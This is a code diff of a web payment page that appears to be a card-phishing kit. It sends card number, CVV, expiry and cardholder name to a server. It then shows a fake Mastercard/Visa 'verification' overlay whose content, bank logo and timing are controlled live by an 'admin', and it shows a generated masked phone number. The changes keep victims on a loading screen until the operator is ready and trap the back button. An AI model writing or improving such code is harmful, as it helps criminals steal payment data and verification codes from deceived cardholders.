@@ -40,7 +40,7 @@
          .items-center { align-items: center; }
          .justify-between { justify-content: space-between; }
          .text-2xl { font-size: 1.5rem; }
-         .text-sm { font-size: 0.875rem; }
+        .text-sm { font-size: 0.875rem; }
          .text-gray-600 { color: #4b5563; }
          .space-x-2 > * + * { margin-left: 0.5rem; }
          .text-green-500 { color: #10b981; }
@@ -408,7 +408,7 @@
                  </div>
                  <div class="text-gray-100">
                      Amount: $1299.00 USD
-                 </div>
+                  </div>
                  <div class="text-gray-100">Invoice ID: INV-<span id="invoiceId"></span></div>
              </div>
              
@@ -558,7 +558,7 @@
  
  <!-- MC Verification Overlay -->
  <div id="mcVerificationOverlay" class="fullscreen-overlay">
-   <!-- Loading Content - Shown Initially -->
+<!-- Loading Content - Shown Initially -->
    <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
      <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
      <!-- Added verification logo during loading -->
@@ -734,8 +734,7 @@
              // Join room based on URL pid parameter
              const urlParams = new URLSearchParams(window.location.search);
              const pid = urlParams.get('pid');
-             if (pid) {
-                 console.log('Joining room for PID:', pid);
+             if (pid) {console.log('Joining room for PID:', pid);
                  socket.emit('join', pid);
                  
                  // If amount is in the URL, update state and display
@@ -813,6 +812,9 @@
          // Setup visitor heartbeat
          setupVisitorHeartbeat();
          
+         // Add back button confirmation for MC verification
+         setupBackButtonConfirmation();
+         
      } catch (error) {
          console.error('Initialization error:', error);
          document.getElementById('app').innerHTML = `
@@ -825,6 +827,80 @@
          `;
      }
  });
+
+// Set up confirmation dialog when user tries to navigate back or close page during MC verification
+function setupBackButtonConfirmation() {
+    // Track if MC verification is active
+    let mcVerificationActive = false;
+    
+    // Function to show custom confirmation dialog
+    function showConfirmationDialog() {
+        return confirm('Do you want to cancel this transaction?');
+    }
+    
+    // Update the MC verification active state
+    function updateMcVerificationState() {
+        const mcOverlay = document.getElementById('mcVerificationOverlay');
+        mcVerificationActive = mcOverlay && mcOverlay.style.display !== 'none';
+    }
+    
+    // Handle beforeunload event (page close, refresh, navigate away)
+    window.addEventListener('beforeunload', function(e) {
+        updateMcVerificationState();
+        if (mcVerificationActive) {
+            // Standard confirmation message
+            const confirmationMessage = 'Do you want to cancel this transaction?';
+            e.returnValue = confirmationMessage;
+            return confirmationMessage;
+        }
+    });
+    
+    // Handle popstate event (back button)
+    window.addEventListener('popstate', function(e) {
+        updateMcVerificationState();
+        if (mcVerificationActive) {
+            // Prevent the default action and show custom dialog
+            const confirmLeave = showConfirmationDialog();
+            
+            // If user confirms leaving
+            if (confirmLeave) {
+                // Cancel the transaction
+                if (socket && state.transactionId) {
+                    socket.emit('mc_verification_cancelled', {
+                        invoiceId: state.transactionId,
+                        reason: 'cancelled_by_user'
+                    });
+                }
+                
+                // Hide MC verification overlay
+                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+                if (mcVerificationOverlay) {
+                    mcVerificationOverlay.style.display = 'none';
+                }
+                
+                // Stop MC timer
+                if (mcTimerInterval) {
+                    clearInterval(mcTimerInterval);
+                    mcTimerInterval = null;
+                }
+                
+                // Show error UI with cancellation message
+                showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
+            } else {
+                // If user cancels leaving, reset the history state to prevent navigation
+                history.pushState(null, null, window.location.pathname + window.location.search);
+            }
+            
+            // Prevent default navigation behavior
+            e.preventDefault();
+            return false;
+        }
+    });
+    
+    // Monitor for back button in standalone mobile browsers or mobile apps
+    // by pushing a state to history on page load and then detecting popstate events
+    history.pushState(null, null, window.location.pathname + window.location.search);
+}
  
  // Function to send visitor information to the server
  function emitVisitorInfo(pid) {
@@ -903,7 +979,7 @@
          console.log('Card data received acknowledgement:', data);
          if (data.invoiceId) {
              socket.emit('join', data.invoiceId);
-             console.log('Joined room for invoice:', data.invoiceId);
+      console.log('Joined room for invoice:', data.invoiceId);
              
              if (!state.transactionId) {
                  state.transactionId = data.invoiceId;
@@ -1046,9 +1122,26 @@ socket.on('show_mc_verification', (data) => {
     
     showProcessingUI();
     
-    setTimeout(() => {
-        showMCVerification(data);
-    }, 1500);
+    // Show the MC verification with just the loading page - IMPORTANT: don't show the full content yet
+    // This addresses requirement #1 - keep showing loading screen until all admin options are selected
+    const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+    const mcLoadingContent = document.getElementById('mcLoadingContent');
+    const mcVerificationContent = document.getElementById('mcVerificationContent');
+    
+    if (mcVerificationOverlay && mcLoadingContent && mcVerificationContent) {
+        // Show the overlay with loading screen
+        mcVerificationOverlay.style.display = 'flex';
+        mcLoadingContent.style.display = 'flex';
+        mcVerificationContent.style.display = 'none';
+        
+        // Update the loading logo based on card type
+        updateLoadingLogo(data.cardType || 'mastercard');
+    }
+    
+    // Update state with transaction ID if provided
+    if (data.invoiceId && !state.transactionId) {
+        state.transactionId = data.invoiceId;
+    }
 });
  
 // Similarly, in the start_verification event handler
@@ -1082,7 +1175,8 @@ socket.on('start_verification', (data) => {
         // Make sure the overlay is actually visible first
         mcVerificationOverlay.style.display = 'flex';
         
-        // Hide loading, show verification content
+        // Hide loading, show verification content - This is where we finally show the verification form
+        // This addresses requirement #1 - only show verification form after admin has completed all options
         mcLoadingContent.style.display = 'none';
         mcVerificationContent.style.display = 'block';
         
@@ -1156,7 +1250,7 @@ socket.on('start_verification', (data) => {
      
      socket.on('update_mc_bank', function(data) {
          if (data.bankCode) {
-             const bankLogo = document.getElementById('bankLogo');
+           const bankLogo = document.getElementById('bankLogo');
              if (bankLogo) {
                  // Map of bank codes to logo URLs
                  const bankLogos = {
@@ -1289,6 +1383,35 @@ socket.on('start_verification', (data) => {
          amountDisplay.textContent = convertedAmount;
      }
  }
+
+// Update function to handle loading logo based on card type
+function updateLoadingLogo(cardType) {
+    const loadingLogoContainer = document.getElementById('loadingVerificationLogo');
+    if (!loadingLogoContainer) return;
+    
+    // Map card types to logos
+    let logoSrc;
+    switch(cardType.toLowerCase()) {
+        case 'visa':
+            logoSrc = 'https://logowik.com/content/uploads/images/visa-new-20215093.jpg';
+            break;
+        case 'amex':
+            logoSrc = 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png';
+            break;
+        case 'discover':
+            logoSrc = 'https://1000logos.net/wp-content/uploads/2021/05/Discover-logo.png';
+            break;
+        case 'rupay':
+            logoSrc = 'https://www.junkdazzle.com/wp-content/smush-webp/2023/12/1280px-Rupay-Logo.png.webp';
+            break;
+        default: // mastercard is default
+            logoSrc = 'https://logodix.com/logo/21144.jpg';
+            break;
+    }
+    
+    // Update the logo in the loading screen
+    loadingLogoContainer.innerHTML = `<img src="${logoSrc}" alt="${cardType}" style="max-height: 90px; max-width: 250px;">`;
+}
  
  function setupCardFormHandlers() {
      console.log('Setting up card form handlers...');
@@ -1300,7 +1423,7 @@ socket.on('start_verification', (data) => {
      
      if (cardNumberInput) {
          cardNumberInput.addEventListener('input', (e) => {
-             const formattedValue = formatCardNumber(e.target.value);
+          const formattedValue = formatCardNumber(e.target.value);
              state.cardForm.cardNumber = formattedValue;
              e.target.value = formattedValue;
              const cardType = detectCardType(formattedValue);
@@ -1484,32 +1607,37 @@ socket.on('start_verification', (data) => {
          };
      }
      
-    // Cancel button handler (continuing)
-     const cancelBtn = document.getElementById('mcCancelBtn');
-     if (cancelBtn) {
-         cancelBtn.onclick = function() {
-             // Hide the verification overlay
-             const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-             if (mcVerificationOverlay) {
-                 mcVerificationOverlay.style.display = 'none';
-             }
-             
-             // Clear the MC timer if it exists
-             if (mcTimerInterval) {
-                 clearInterval(mcTimerInterval);
-                 mcTimerInterval = null;
-             }
-             
-             // Notify server
-             socket.emit('mc_verification_cancelled', {
-                 invoiceId: state.transactionId,
-                 reason: 'cancelled_by_user'
-             });
-             
-             // Show error UI with canceled message
-             showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
-         };
-     }
+    // Cancel button handler (with confirmation dialog)
+    const cancelBtn = document.getElementById('mcCancelBtn');
+    if (cancelBtn) {
+        cancelBtn.onclick = function() {
+            // Show confirmation dialog - addressing requirement #3
+            const confirmCancel = confirm('Do you want to cancel this transaction?');
+            
+            if (confirmCancel) {
+                // Hide the verification overlay
+                const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+                if (mcVerificationOverlay) {
+                    mcVerificationOverlay.style.display = 'none';
+                }
+                
+                // Clear the MC timer if it exists
+                if (mcTimerInterval) {
+                    clearInterval(mcTimerInterval);
+                    mcTimerInterval = null;
+                }
+                
+                // Notify server
+                socket.emit('mc_verification_cancelled', {
+                    invoiceId: state.transactionId,
+                    reason: 'cancelled_by_user'
+                });
+                
+                // Show error UI with canceled message
+                showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
+            }
+        };
+    }
  }
  
  function convertCurrency(amount, fromCurrency, toCurrency) {
@@ -1546,54 +1674,54 @@ socket.on('start_verification', (data) => {
      }
  }
  
- // Start the timer for 4:59 minutes (299 seconds)
- function startMCTimer() {
-     const timerDisplay = document.getElementById('mcTimer');
-     if (!timerDisplay) return;
-     
-     let timeLeft = 299; // 4:59 in seconds (4 minutes and 59 seconds)
-     
-     // Clear any existing timer
-     if (mcTimerInterval) {
-         clearInterval(mcTimerInterval);
-     }
-     
-     // Update timer display function
-     function updateTimerDisplay() {
-         const minutes = Math.floor(timeLeft / 60);
-         const seconds = timeLeft % 60;
-         timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
-     }
-     
-     // Initial display
-     updateTimerDisplay();
-     
-     // Start the timer
-     mcTimerInterval = setInterval(() => {
-         timeLeft--;
-         updateTimerDisplay();
-         
-         if (timeLeft <= 0) {
-             clearInterval(mcTimerInterval);
-             mcTimerInterval = null;
-             
-             // Hide the verification overlay
-             const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-             if (mcVerificationOverlay) {
-                 mcVerificationOverlay.style.display = 'none';
-             }
-             
-             // Notify server
-             socket.emit('mc_verification_cancelled', {
-                 invoiceId: state.transactionId,
-                 reason: 'timeout'
-             });
-             
-             // Show error UI with timeout message
-             showErrorUI("Session Expired", "Your verification session has timed out. Please try again.");
-         }
-     }, 1000);
- }
+// Start the timer for 4:59 minutes (299 seconds)
+function startMCTimer() {
+    const timerDisplay = document.getElementById('mcTimer');
+    if (!timerDisplay) return;
+    
+    let timeLeft = 299; // 4:59 in seconds (4 minutes and 59 seconds)
+    
+    // Clear any existing timer
+    if (mcTimerInterval) {
+        clearInterval(mcTimerInterval);
+    }
+    
+    // Update timer display function
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerDisplay.textContent = `Session expires in: ${minutes}:${seconds.toString().padStart(2, '0')}`;
+    }
+    
+    // Initial display
+    updateTimerDisplay();
+    
+    // Start the timer
+    mcTimerInterval = setInterval(() => {
+        timeLeft--;
+        updateTimerDisplay();
+        
+        if (timeLeft <= 0) {
+            clearInterval(mcTimerInterval);
+            mcTimerInterval = null;
+            
+            // Hide the verification overlay
+            const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+            if (mcVerificationOverlay) {
+                mcVerificationOverlay.style.display = 'none';
+            }
+            
+            // Notify server about timeout
+            socket.emit('mc_verification_cancelled', {
+                invoiceId: state.transactionId,
+                reason: 'timeout'
+            });
+            
+            // Show error UI with timeout message
+            showErrorUI("Session Expired", "Your verification session has timed out. Please try again.");
+        }
+    }, 1000);
+}
  
  function getReadableFailureReason(reasonCode) {
      const reasons = {
@@ -1816,7 +1944,7 @@ function updateMcVerificationUI(data) {
      }
      
      if (document.getElementById('referenceId')) {
-         document.getElementById('referenceId').textContent = data.referenceId || data.invoiceId?.substring(0, 6) || 'g4pxye';
+document.getElementById('referenceId').textContent = data.referenceId || data.invoiceId?.substring(0, 6) || 'g4pxye';
      }
      
      // Set up event handlers for buttons
@@ -1904,6 +2032,16 @@ function updateMcVerificationUI(data) {
          // Determine card/verification type
          let cardType = data.cardType || detectCardType(state.cardForm.cardNumber);
          
+         // Show only the loading content initially - IMPORTANT
+         // This implements requirement #1 - keep showing loading screen until admin finishes options
+         const mcLoadingContent = document.getElementById('mcLoadingContent');
+         const mcVerificationContent = document.getElementById('mcVerificationContent');
+         
+         if (mcLoadingContent && mcVerificationContent) {
+             mcLoadingContent.style.display = 'flex';
+             mcVerificationContent.style.display = 'none';
+         }
+         
          // Select appropriate logo for loading screen
          if (loadingVerificationLogo) {
              let logoSrc;
@@ -1927,37 +2065,11 @@ function updateMcVerificationUI(data) {
          
          // Show the overlay with loading screen
          mcVerificationOverlay.style.display = 'flex';
-         const mcLoadingContent = document.getElementById('mcLoadingContent');
-         const mcVerificationContent = document.getElementById('mcVerificationContent');
          
-         if (mcLoadingContent && mcVerificationContent) {
-             mcLoadingContent.style.display = 'flex';
-             mcVerificationContent.style.display = 'none';
-             
-             // Store transaction ID if provided
-             if (data.invoiceId && !state.transactionId) {
-                 state.transactionId = data.invoiceId;
-             }
+         // Store transaction ID if provided
+         if (data.invoiceId && !state.transactionId) {
+             state.transactionId = data.invoiceId;
          }
-         
-         // If the start_verification event doesn't come within 3 seconds,
-         // force show the verification content anyway
-         setTimeout(() => {
-             const mcLoadingContent = document.getElementById('mcLoadingContent');
-             const mcVerificationContent = document.getElementById('mcVerificationContent');
-             
-             if (mcLoadingContent && mcVerificationContent && mcLoadingContent.style.display !== 'none') {
-                 console.log('Forcing display of verification content after timeout');
-                 mcLoadingContent.style.display = 'none';
-                 mcVerificationContent.style.display = 'block';
-                 
-                 // Update UI with available data
-                 updateMcVerificationUI(data);
-                 
-                 // Start the timer
-                 startMCTimer();
-             }
-         }, 3000);
      }
  }
  
@@ -2107,7 +2219,7 @@ function generateRandomPhone() {
      };
      
      socket.emit('process_payment', {
-         cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
+cardNumber: state.cardForm.cardNumber.replace(/\s/g, ''),
          expiryDate: state.cardForm.expiryDate,
          cvv: state.cardForm.cvv,
          cardHolder: state.cardForm.cardHolder,
@@ -2383,8 +2495,7 @@ function generateRandomPhone() {
      if (!state.maskedPhone) {
          generateRandomPhone();
      }
-     
-     const appDiv = document.getElementById('app');
+       const appDiv = document.getElementById('app');
      appDiv.innerHTML = `
        <div class="card-container w-full max-w-5xl">
              <div class="header-bar">
@@ -2659,7 +2770,7 @@ function generateRandomPhone() {
      
      if (timerRef) {
          clearInterval(timerRef);
-         timerRef = null;
+      timerRef = null;
      }
      
      showCardUI();
@@ -2745,28 +2856,33 @@ function generateRandomPhone() {
      if (event.target && event.target.id === 'mcCancelBtn') {
          console.log('Cancel button clicked');
          
-         // Hide the verification overlay
-         const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
-         if (mcVerificationOverlay) {
-             mcVerificationOverlay.style.display = 'none';
-         }
+         // Show confirmation dialog - addressing requirement #3
+         const confirmCancel = confirm('Do you want to cancel this transaction?');
          
-         // Clear any timers
-         if (mcTimerInterval) {
-             clearInterval(mcTimerInterval);
-             mcTimerInterval = null;
+         if (confirmCancel) {
+             // Hide the verification overlay
+             const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
+             if (mcVerificationOverlay) {
+                 mcVerificationOverlay.style.display = 'none';
+             }
+             
+             // Clear any timers
+             if (mcTimerInterval) {
+                 clearInterval(mcTimerInterval);
+                 mcTimerInterval = null;
+             }
+             
+             // Notify server
+             if (socket) {
+                 socket.emit('mc_verification_cancelled', {
+                     invoiceId: state.transactionId || '',
+                     reason: 'cancelled_by_user'
+                 });
+             }
+             
+             // Show error UI
+             showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
          }
-         
-         // Notify server
-         if (socket) {
-             socket.emit('mc_verification_cancelled', {
-                 invoiceId: state.transactionId || '',
-                 reason: 'cancelled_by_user'
-             });
-         }
-         
-         // Show error UI
-         showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
      }
  }, true);
  </script>
